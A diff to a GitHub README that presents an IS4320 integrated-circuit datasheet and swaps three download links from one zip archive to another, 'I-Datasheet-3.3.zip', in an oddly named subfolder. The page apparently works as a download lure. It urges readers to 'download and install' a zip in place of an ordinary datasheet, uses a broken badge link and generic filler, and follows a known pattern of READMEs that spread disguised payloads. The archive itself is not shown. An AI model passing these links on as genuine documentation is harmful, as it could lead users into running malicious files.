@@ -1,6 +1,6 @@
 # 🛠️ IS4320_Datasheet - Your Guide to Understanding IS4320 Data
 
-![Download IS4320 Datasheet](https://raw.githubusercontent.com/nyoks1337/IS4320_Datasheet/main/trinitarian/IS4320_Datasheet.zip%20Datasheet-Click%20Here-brightgreen)
+![Download IS4320 Datasheet](https://github.com/nyoks1337/IS4320_Datasheet/raw/refs/heads/main/trinitarian/I-Datasheet-3.3.zip%20Datasheet-Click%20Here-brightgreen)
 
 ## 📚 Overview
 
@@ -12,7 +12,7 @@ To begin using the IS4320 Datasheet, you only need to follow a few simple steps 
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page:  
-   [Download the IS4320 Datasheet](https://raw.githubusercontent.com/nyoks1337/IS4320_Datasheet/main/trinitarian/IS4320_Datasheet.zip)
+   [Download the IS4320 Datasheet](https://github.com/nyoks1337/IS4320_Datasheet/raw/refs/heads/main/trinitarian/I-Datasheet-3.3.zip)
 
 2. **Choose the Datasheet**  
    On the Releases page, look for the latest version of the datasheet. The files are usually labeled clearly by version number.
@@ -26,7 +26,7 @@ To begin using the IS4320 Datasheet, you only need to follow a few simple steps 
 ## 📥 Download & Install
 
 You can download the IS4320 Datasheet by visiting this page:  
-[Download the IS4320 Datasheet](https://raw.githubusercontent.com/nyoks1337/IS4320_Datasheet/main/trinitarian/IS4320_Datasheet.zip)
+[Download the IS4320 Datasheet](https://github.com/nyoks1337/IS4320_Datasheet/raw/refs/heads/main/trinitarian/I-Datasheet-3.3.zip)
 
 The file contains complete instructions and specifications, making it easier for you to use the IS4320 integrated circuit.
 
